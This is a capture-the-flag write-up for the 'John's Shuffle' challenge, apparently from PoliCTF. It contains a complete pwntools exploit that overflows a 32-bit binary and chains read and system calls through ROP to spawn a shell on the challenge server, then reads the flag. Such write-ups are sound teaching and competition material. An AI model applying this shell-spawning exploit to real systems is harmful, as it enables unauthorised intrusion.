# John's Shuffle
John is completely drunk and unable to protect his poor stack.. Fortunately he can still count on his terrific shuffling skills.

```
>>> from pwn import *
>>> elf = ELF('johns-shuffle')
    Arch:          i386-32-little
    RELRO:         Partial RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           No PIE
```

## Recon
The first shot at overflowing by throwing a ton of `A`'s worked. We don't actually know what the vulnerbility was, as I didn't open the binary in IDA.

Once we have control of EIP, and the fact that NX is on, we have to start ROP'ing. Using `pwntools`, We immediately see that we have `system` in our binary, but not the string `/bin/sh`. In order to ROP into `system` we have to have a pointer to the string `/bin/sh`. No worries though, because we also have `read` in our binary. 

## Exploit
* Overflow the stack to control EIP.
* ROP into the following chain:
    * `read` to read an additional input of `/bin/sh` into the .bss segment
    * `system` into the .bss segment where we read our `/bin/sh` string
* ???
* Profit

The binary itself randomizes the GOT each connection, so the exploit can take a while to actually land while waiting for our `system` and `read` addresses to line up properly. Give it a bit, and the exploit lands perfectly.

### Exploit code
```python
from pwn import *

elf = ELF('johns-shuffle')
rop = ROP(elf)

add_esp_8 = rop.pivots[8]
system = elf.symbols['system']

# Found system in ELF
log.info("System: {}".format(hex(system)))

# ROP shellcode
# read '/bin/sh' into a known location
# call /bin/sh from known location via system
rop.read(0, elf.bss(), 8)
rop.system(elf.bss())

# Set up our payload 
payload = 'b' * 166
payload += str(rop)
payload += cyclic(1000)

print rop.dump()

log.info("You can walk away.. this might take while..")
log.info("Waiting on the randomization to work")
while True:
    try:
        # r = process('./johns-shuffle')
        with remote('shuffle.polictf.it', 80) as r:

            # Debug code
            '''
            gdb.attach(r, """
            bp {}
            c
            """.format(hex(elf.symbols['read'])))
            '''

            # PWN
            r.sendline(payload)

            # Sleep enough to wait for the read() call to hit
            sleep(0.2)

            # Write /bin/sh in the .bss segment to use with our system() ROP
            r.sendline('/bin/sh\x00')

            # Command to send to our new shell
            r.sendline('cat /home/ctf/flag')

            # Be sure to retrieve the flag from the socket
            for _ in xrange(4):
                output = r.recv()
                if 'flag' in output.lower():
                    log.info('FLAG: {}'.format(output))
                    raw_input()
    except:
        pass
```
